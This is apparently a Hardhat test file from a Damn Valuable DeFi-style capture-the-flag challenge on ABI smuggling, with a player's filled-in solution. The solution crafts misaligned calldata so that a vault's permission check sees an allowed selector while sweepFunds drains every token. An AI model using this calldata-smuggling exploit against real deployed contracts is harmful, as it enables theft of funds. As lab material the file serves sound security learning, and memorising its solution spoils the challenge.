const { ethers } = require("hardhat");
const { expect } = require("chai");
const { keccak256, toUtf8Bytes } = require("ethers/lib/utils");

describe("[Challenge] ABI smuggling", function () {
  let deployer, player, recovery;
  let token, vault;

  const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player, recovery] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy Vault
    vault = await (
      await ethers.getContractFactory("SelfAuthorizedVault", deployer)
    ).deploy();
    expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

    // Set permissions
    const deployerPermission = await vault.getActionId(
      "0x85fb709d",
      deployer.address,
      vault.address
    );
    const playerPermission = await vault.getActionId(
      "0xd9caed12",
      player.address,
      vault.address
    );
    await vault.setPermissions([deployerPermission, playerPermission]);
    expect(await vault.permissions(deployerPermission)).to.be.true;
    expect(await vault.permissions(playerPermission)).to.be.true;

    // Make sure Vault is initialized
    expect(await vault.initialized()).to.be.true;

    // Deposit tokens into the vault
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

    expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(0);

    // Cannot call Vault directly
    await expect(
      vault.sweepFunds(deployer.address, token.address)
    ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
    await expect(
      vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
    ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    // if the compiler breaks down the accessing of bytes parameter to goto the offset pointed, then read according to the length, then we set the function selector of withdraw at the 4th bytes place and keep the start of the bytes parameter to the 5th byte.

    const fakeAbi = [
      "function execute(address target, bytes calldata actionData , uint256 garbage,bytes4 selector)",
      "function sweepFunds(address receiver, address token) ",
    ];
    const interface = new ethers.utils.Interface(fakeAbi);
    const fakeEncode = interface.encodeFunctionData("execute", [
      vault.address,
      interface.encodeFunctionData("sweepFunds", [
        recovery.address,
        token.address,
      ]),
      0,
      "0xd9caed12",
    ]);
    const originalExecuteSigHash = keccak256(
      toUtf8Bytes("execute(address,bytes)")
    ).slice(0, 10);
    const attackEncode = originalExecuteSigHash + fakeEncode.slice(10);
    const tx = await player.sendTransaction({
      to: vault.address,
      data: attackEncode,
    });
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(0);
    expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
